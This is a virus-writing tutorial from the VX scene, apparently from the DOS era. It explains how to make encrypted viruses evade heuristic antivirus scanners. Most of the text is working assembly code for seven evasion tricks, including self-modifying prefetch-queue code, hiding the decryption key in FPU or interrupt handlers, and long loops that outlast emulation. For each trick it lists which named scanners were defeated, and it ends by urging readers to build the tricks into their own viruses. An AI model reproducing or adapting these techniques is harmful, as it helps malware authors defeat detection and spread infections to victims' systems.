    In the early days of computer virii it was sufficient for AV programs 
to search for a set of virus patterns. But the number of virii increased 
more and more rapidly, and so the AV people invented something called 
heuristics to make our job harder. Heuristic scanners emulate the code of 
every program they scan in a so-called "virtual machine" and search for 
virus-like actions. So it should be *theoretically* possible to find every 
new virus. Theoretically, because of course these code analysers can't 
emulate the "real" CPU to 100%, and so not every virus gets actually cought.
So in my humble opinion, it is the damn duty of us, the VX community, to 
search for the flaws in these heuristic engines and exploit them for our 
own goals. What I'm talking of are tricks to fool these engines, to make 
our newest creations invisible to those evil programs which want to find&
kill our babies to. This is in my opinion one of the most interesting fields
in virus programming (it's always a great feeling to outsmarten your enemies
 ;-) ). Here are the results of the research I've done into this topic in 
the last time.

    If you want to make your virii anti-heuristic, the first thing you need
are heuristic scanners to test your creations with. I recommend you to get 
as many as them as possible, because every one has different storng points 
and flaws. I'll give you a short list of scanners I use/test and where to 
get them:

-> Thunderbyte Antivirus (http://www.thunderbyte.com): In the earlier days
this was considered one of the best scanners, but nowadays it is considered
quite weak by most VXers, at least its "heuristics" (it's actually based on
little scanstrings). But on the other hand it comes with a lot of other AV
utilities beside the scanner (checksummer, cleaner, memory resident
utilities...). A lot of stuff to work around for those of you who are
interested in retro structures, but this is a different story...
By the way, I would recommend you to get version 7.xx besides the actual 
one, because this version allows you to make your own scanstrings. Can be 
quite important if you accidentally infect yourself...

-> F-prot (http://www.datafellows.com): Isn't too bad, although there are
a lot of better ones. The interesting thing about it is that the last 
versions had much better heuristics than the current ones. So I recommend 
you to get yourself somewhere a copy of v2.28 or something like that (I use
v2.27), and to test your virus with both versions. Another interesting 
feature of this scannner is its /PARANOID command line parameter. If you 
use it, the scanner goes into a highly sensible mode (with a lot of false 
positives). For that reason it isn't really necessarry to beat even f-prot/
paranoid, but if you do so, you know that your anti-heuristic tricks are 
*really* good.

-> AVP (http://www.avp.ch): In my opinion the best heuristic scanner, 
really hard to fool. I used version 3.0 build 128

-> NOD (http://www.eset.sk): Nearly as good as AVP

-> Dr. Web (http://www.dials.ru): Also a very good one. Those russians know
how to make good AVs...

-> Dr Solomon's (http://www.drsolomon.com): A mid quality scanner from our
friends at NAI, but still better than McAfee (*duh*)

-> Ikarus Antivirus (http://www.ikarus.at): A product of middle quality, I
just use it because of patriotic reasons.


                >-----------------------------------------<
			       The main idea
                >-----------------------------------------<


    All my tricks I am going to present to you are based on the same idea:
The virus is encrypted, and you try to stop the code emulation before the 
scanner can decrypt the main virus body, or you hide the decryption key 
from the scanner. If you haven't worked with encryption yet, the key-hiding
tricks may also work if you "encrypt" the registers (for example the fun-
ction values for int 21h), although I haven't tested this. For example use 
for opening a file:

	mov ax, 3D02h-key
	add ax, key
	int 21h


                >-----------------------------------------<
                  1. THE "INVERTED" PREFETCH QUEUE TRICK
                >-----------------------------------------<


    Older Processors, like the 386 or the 486 used something called the 
prefetch instruction queue (PIQ) to speed up the code execution. The idea 
behind this is that WHILE the CPU processes one instruction, the following 
instructions are already read into a CPU-internal buffer. Therefore a 
change in the code that follows the actual processed instruction has no 
effect! let's look at an example for this:

	mov word ptr cs:[offset piq], 20CDh
	piq:
	nop
	nop

    You should think that the program terminates, because the two nops have 
been overwritten with an int 20h, but on a 386 or 486 this isn't the case, 
because the nops are already in the cpu! But on a Pentium/Pentium II the 
code will actually be overwritten and the program quits.

    If you want to use this as an anti heuristic trick, you must know that 
this was a widely used against heuristic scanners in the days of the 386/486.
But then the AVs improved and now they emulate the prefetch queue. Isn't 
that strange? They emulate something that isn't there anymore on modern 
processors! And this is what we use against them! Let's look at the example 
above again: on a pentium or a higher cpu the program will, as I already 
said, terminate, because those processors have no PIQ, but most AVs will 
think the code goes on with the two nops because of the PIQ. So here's what
we'll do:

	mov word ptr [offset prefetch], 06C7h
prefetch:
	int 20h
	dw offset decrypt_key
	dw key

the int 20h will be overwritten, and instead there will be the instruction:

	mov word ptr [decrypt_key], key

    The AVs will think the program terminates because of the PIQ, but actual-
ly the program execution goes on with the setting of the decryption key in
our decryption rotine. We only have one problem: this code will only work 
on Pentiums and upwards. To make it compatible with 486ers and below we'll 
have to clear the PIQ between the two instructions. Nothing more simple than
that! You must also know that all jump instructions (jmp, call, loop, int...) 
clear the PIQ (quite necessary, if you think of it). But we can't simply 
place a JMP Short $+2 between the instructions, as it is used normally to 
clear the PIQ, because this would also be noticed by code emulators. But we 
can use a special feature of our CPU, the trap flat. If this flag is set, 
the CPU will call int 1 after every instruction, and remember, an int clears 
the PIQ. This is normally only used by debuggers, so the int 1 vector points
to a simple IRET in the normal case, so we can use that without any problems.
But anyhow, it's a good idea to clear the trap flag again afterwards. Here's 
the complete code that will run on any processor (assumes DS=CS):

	pushf                                   ;flags on the stack
	pop ax                                  ;flags from stack into AX
	or ax, 100000000b                       ;set trap flag
	push ax                                 ;put the modified flags in 
						;AX back...
	popf                                    ;into the flag register via
						;the stack
	
	mov word ptr [offset prefetch], 06C7h   ;modify the following 
						;instruction
	prefetch:                               ;here gets int1 called 
						;=> clears PIQ
	int 20h                                 ;This is never executed
	dw offset decrypt_key                   ;where we want to write our
						;key to
	dw key                                  ;the actual decryption key

	pushf                                   ;clear the trap flag again 
	pop ax                                  ;with the same method as 
	xor ax, 100000000b                      ;above. will also fool some
	push ax					;debuggers
	popf

	mov word ptr [offset prefetch], 20CDh   ;restore the int20h 
						;(next generations)


    This trick fooled AVP, Dr. Web, f-prot v3.04 (even with the /PARANOID
flag),but not f-prot v2.27, Nod, Ikarus and Dr. Solomon's. f-prot v2.27 and 
Ikarus, on the other hand were fooled by the "normal" PIQ trick (which does
not run on modern processors, you remember).


                >-----------------------------------------<
			     2. THE FPU TRICK
                >-----------------------------------------<


    My favourite trick, because it is very simple but nevertheless the most
effective one. It fools *ALL* tested scanners!!! The only thing you must 
know is that heuristic scanners don't emulate floating point instructions.
Obviously AVs think that FPU instructions aren't used in virii anyhow. Let's
prove they are wrong! Here's what we do: After encryption we convert the
crypt key to a floating point number. To decrypt we'll have to convert it 
back to an integer:

; AFTER ENCRYPTION:
mov decrypt_key, key                    ;save key into integer variable
fild decrypt_key                        ;load integer key into FPU and store
fstp decrypt_float_key                  ;it back as floating point number
mov decrypt_key, 0                      ;destroy the key (very important!)

; BEFORE DECRYPTION:
fld decrypt_float_key                   ;load the key as floating point number
fistp decrypt_key                       ;into the FPU and store it back as int

As I said before, this trick is very easy and extremely effective, but if 
you use it, please consider that it has "high system requirements": If your 
virus is run on a machine without a FPU (386, 486SX), it will crash.


                >-----------------------------------------<
			    3. THE INT 1 TRICK
                >-----------------------------------------<


As I wrote before, int 1 is called after each instruction by the CPU if the
trap flag is set. But of course you can also call interrupt 1 manually with
the int command. This is generally assembled to 0CDh/001h. And this is quite
strange, since there is a special opcode for int1 (0F1h), although this isn't
documented. But "not documented" means also "not emulated by AVs", *grin*.
So here's what we'll do: We set an own int 1 handler, which returns the
decryption key and call it with the undocumented opcode, and AVs will have 
no idea what the decryption key is:

	mov ax, 3501h                   ;get int vector 1, so we can 
					;restore it later
	int 21h                         ;not really necessary, but a 
					;little bit saver
	mov int1_segm, es
	mov int1_offs, bx

	mov ax, 2501h                   ;set int vector 1 to our own 
					;routine
	mov dx, offset int1_handler     ;we assume DS=CS
	int 21h

	db 0F1h                         ;this will call our int 1 handler,
	mov decrypt_key, ax             ;which returns the decryption key

	mov ax, 2501h                   ;restore the original int 1 handler
	mov dx, cs:int1_offs
	mov ds, cs:int1_segm
	int 21h

	[...]

	int1_handler:
	mov ax, key
	iret

    Another funny thing you can do with this trick is simulate to quit the
program. So here's what you do:

	[...]

	db 0F1h                         ;calls our int 1 handler (see above);
	mov ax, 4c00h                   ;quit program
	int 21h                         ;but.. this code is never reached..;-)
	
	[...]

	int1_handler:
	mov bx, sp                      ;modify return address, so the quit 
	add word ptr ss:[bx], 5         ;command is never executed.
	iret

    This is also a very powerful trick. In my tests only f-prot v2.27 
/PARANOID detected it. If you want to see it in a full virus, feel free to 
take a look at my PRŽH! virus.


                >-----------------------------------------<
                           4. THE INT 6 TRICK
                >-----------------------------------------<


    Interrupt 6 is always called by the CPU if it finds an illegal instruction.
We can use this in a way very similar to the int 1 trick: We set an int 6
handler, which returns our decryption key, and then we call it with an
invalid instruction. But we have to consider one thing: the return offset in
the int 6 handler will point to the invalid opcode, so we'll have to modify
the return offset if we don't want to get in an endless loop.

	mov ax, 3506h                   ;get int vector 6, so we can restore 
					;it later
	int 21h                         ;not really necessary, but a little
					;bit saver
	mov int6_segm, es
	mov int6_offs, bx

	mov ax, 2506h                   ;set int vector 6 to our 
					;own routine
	mov dx, offset int6_handler
	int 21h

	dw 0FFFFh                       ;an invalid opcode, will call our 
	mov decrypt_key, ax             ;int 6 handler, which returns the 
					;decryption key

	mov ax, 2506h                   ;restore the original int 6 handler
	mov dx, cs:int6_offs
	mov ds, cs:int6_segm
	int 21h

	[...]

	int6_handler:
	mov ax, key
	mov bx, sp
	add word ptr ss:[bx], 2         ;modify return address - very 
					;important!
					;2 is the size of our invalid 
					;opcode.
	iret

    Please note that this won't work in a windows dos-window, since windows 
gets control first in the case of an invalid opcode and terminates the 
program with an error message (thanks to Z0MBiE for that tip). So if you 
want to make your DOS file virii windows compatible, DON'T use this trick!!! 
In boot sector virii it should work fine, though.


                >-----------------------------------------<
		   5. INFECT COM FILES WITH A FAR JUMP
                >-----------------------------------------<


    I don't like delta offsets, and so I tried out one day to infect com 
files with a far jump at the beginning (plus some code to relocate it, of 
course):

	mov ax, cs                      ;Relocate far Jump
	add [offset com_seg], ax
	JMP SHORT $+2                   ;Clear prefetch queue
	db 0EAh                         ;OP-Code far Jump
	dw offset start                 ;Offset
	com_seg dw 0                    ;Segment (length of com file in 
					;paragraphs) pad filesize to even 
					;paragraph!

    It worked perfectly, and to my pleasant surprise I found out that this 
way of infection prevents AVP and TBSCAN from saying the file is infected. 
To see it in full context, have a look at my PRŽH!-virus again.


                >-----------------------------------------<
		       6. INITIAL REGISTER VALUES
                >-----------------------------------------<


    In most DOS versions the registers carry the same value at the start 
of a program:

AX=BX=0000h (if the first/second command line parameter contain a illegal
drive letter, AL/AH are set to 0FFh)
CX=00FFh
DX=DS=ES=PSP segment address
SI=IP
DI=SP
BP=91Ch/912h depending on DOS/Windows version.

    If you know that, you can use this values for encryption - many AVs don't
emulate these values correctly, since most of them are undocumented. For
example I used 91h (BP shr 4) in my tests to encrypt/decrypt the virus body.
It fooled TBAV, DrWeb, f-prot v2.27 and Ikarus - well, but not the better
ones like AVP and NOD. Of course you can also use other register values than
BP, save your encryption key in the stack pointer of the EXE header, for
example, then set up the correct stack in the beginning and decrypt using DI.
Or you encrypt with not and decrypt with xor cl. Just be creative. But please
remember that this is undocumented and not the same in all DOS versions. 
FreeDOS, for example, sets all general registers to zero in the beginning, so
if you use this trick, be prepared that your virus will crash under those
enviroments. Also, you'll have to combine this trick with other ones to fool
all AVs, since it is not too powerful, as I already stated before. For this
reasons, this trick is not one of my favourite ones. But anyhow, thanks go 
to bfr0vrfl0 for inspiration to that trick.


                >-----------------------------------------<
			    7. "ENDLESS" LOOPS
                >-----------------------------------------<


    This is a very old trick, and unlike all other tricks presented in this
article it wasn't found out by myself. But when I tried it out, I was very
surprised to find that it still works so good. It fools Thunderbyte, Dr. Web
and Ikarus. The idea is that these heuristic scanners only emulate the first
instructions and then stop to speed up scanning. So we put a very long loop
in the beginning of our virus, this is the "classic" form:

	mov cx, 0FFFFh
	loop_head:
	jmp short over_it
	mov ax, 4C00h                   ;actually this isn't needet, but 
	int 21h                         ;it's the "classic" implementation 
					;of this trick.
	over_it:
	loop loop_head
	
    You can also use different loop types, or you use, like in Opic's 
Odessa-B virus, very long decryption loops.

				FINAL NOTES
                >-----------------------------------------<


    All this tricks presented here worked at the date of release of this 
document. It is of course possible that AVs mend out some flaws and some 
of these tricks won't work in the future anymore.

    Anyways, feel free to include this tricks in your own virii! Make them
as undetectable as hell! Let's show those stupid AV dickheads how slobby
their "protection" is!
